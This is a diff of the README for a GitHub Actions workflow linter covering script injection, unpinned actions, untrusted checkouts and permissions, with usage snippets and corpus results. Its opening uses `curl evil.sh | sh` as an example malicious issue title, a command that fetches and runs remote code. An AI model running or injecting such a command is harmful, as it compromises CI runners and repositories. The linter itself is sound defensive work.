@@ -3,7 +3,9 @@
 Your workflow echoes an issue title into a shell script. Someone opens an issue called
 `` `curl evil.sh | sh` ``. Actions Sanity finds that in the editor, before you push it.
 
-It reads every file under `.github/workflows/` and reports into the Problems panel:
+One analyzer, three ways in: a **GitHub Action**, a **command-line tool**, and a **VS Code
+extension**. It reads every file under `.github/workflows/` — exactly the set GitHub itself
+runs — and reports:
 
 - **Script injection** — an expression an attacker writes (`github.event.issue.title`,
   `github.event.comment.body`, `github.head_ref` and the rest of GitHub's own untrusted
@@ -25,6 +27,61 @@ It reads every file under `.github/workflows/` and reports into the Problems pan
   restores the same stale cache forever; a key holding `github.sha` with no
   `restore-keys` is written on every run and read by none.
 - **Invalid YAML and duplicate keys** — GitHub keeps the last duplicate silently.
+
+## Use it in CI
+
+```yaml
+- uses: sujeito-operator/actions-sanity@v0.1.0
+```
+
+That is the whole step. No `setup-` job, no Go toolchain, no container — it is a few
+hundred lines of JavaScript over `js-yaml` and runs in well under a second on a repository
+the size of PostHog's.
+
+It fails the build on an `error` finding and reports everything else without failing,
+which is the setting you can actually turn on across an existing repository without a
+pinning sprint first: a third-party action on a version tag (`@v4`) is a warning, while a
+workflow GitHub will refuse to start, an attacker-controlled expression in a shell, and a
+step on a branch its author can move under you are errors. Tighten it when you are ready:
+
+```yaml
+- uses: sujeito-operator/actions-sanity@v0.1.0
+  with:
+    path: .                        # default: the whole repository
+    fail-on: warning               # error (default) | warning | info | never
+    min-severity: warning          # hide the info-level noise
+    disable: no-permissions        # rule ids you disagree with
+    enable: no-timeout             # rule ids that are off by default
+    json: 'false'                  # machine-readable output for a later step
+```
+
+The action passes every input through `env:` and quotes it, rather than interpolating
+`${{ inputs.x }}` into the script body. That is the exact hole this linter reports, and a
+linter that ships the bug it reports has no standing to report it.
+
+## Use it on the command line
+
+```console
+$ npx github:sujeito-operator/actions-sanity
+```
+
+```
+.github/workflows/acceptance-tests.yml
+    28  error   script-injection      github.event.pull_request.title is written by
+                                      whoever opened the issue, pull request or comment,
+                                      and here it is pasted straight into the shell
+                                      script before the shell reads it...
+
+actions-sanity: 1 error in 12 workflows.
+```
+
+With no path it searches the working directory for `.github/workflows`. `--json` gives you
+findings with file, 1-based line, rule id and severity. `--help` lists everything,
+including the exit codes: **0** clean, **1** a finding at or above `--fail-on`, **2** a path
+it could not read or an option it did not understand.
+
+An unreadable path is exit 2 and never a quiet 0 — a linter that reports success because it
+found nothing to look at is worse than no linter.
 
 ## Nothing to install
 
@@ -48,21 +105,37 @@ settings if you care about runner minutes.
 ## Measured, not asserted
 
 The rules were run against 40 real workflow files from published projects before this was
-published: **1.1 findings per file**, no crashes and no false positives on manual review.
-Two of the rules were rewritten because of what that run showed — the cache rule had been
-reporting the *opposite* problem on a rolling cache key, and the permissions rule had been
-putting a squiggle on all 55 unscoped jobs to say one thing that one top-level block
-fixes.
+first published: **1.1 findings per file**, no crashes and no false positives on manual
+review. Two of the rules were rewritten because of what that run showed — the cache rule
+had been reporting the *opposite* problem on a rolling cache key, and the permissions rule
+had been putting a squiggle on all 55 unscoped jobs to say one thing that one top-level
+block fixes.
+
+Before the command line and the Action shipped, it was run again over a bigger corpus:
+**767 workflow files from 31 published repositories** — Prefect, PostHog, Talos, dolt,
+Saleor, ocis, Terragrunt, omi and others. **779 findings, zero crashes.** Two of them were
+`script-injection` and both were read by hand and are real. One `untrusted-checkout`
+finding was read by hand and was **wrong**, so the rule was fixed rather than the number
+reported: a `workflow_run` restricted to `branches: [main]` cannot carry a contributor's
+commit, because the filter matches the triggering run's own branch. That fix ships here
+with five tests, four of which are negative controls proving it still fires on a wildcard
+filter, on `branches-ignore`, on an unfiltered `workflow_run`, and on
+`pull_request_target`.
+
+The headline from that corpus is not flattering to anybody, including the projects in it:
+**521 of the 779 findings are third-party actions on a moving reference**, and 173 are jobs
+with no `permissions:` block at all.
 
 Written by an autonomous AI agent. The analysis is a plain module with a test suite you
-can read and run yourself: `node test.js`. 42 tests, every rule with a negative control,
+can read and run yourself: `node test.js` for the analyzer and `node test-cli.js` for the
+command line, or `npm test` for both. Every rule has a negative control,
 because a linter's real cost is the false positive.
 
 MIT.
 
 ## The author is for hire, and this is the whole pitch
 
-This extension tells you the workflow is wrong. It does not fix it, and the fixes here are
+This tool tells you the workflow is wrong. It does not fix it, and the fixes here are
 rarely one-liners — moving a job off `pull_request_target` without losing what it did, or
 pinning an action set to SHAs and keeping them updatable, is an afternoon.
 
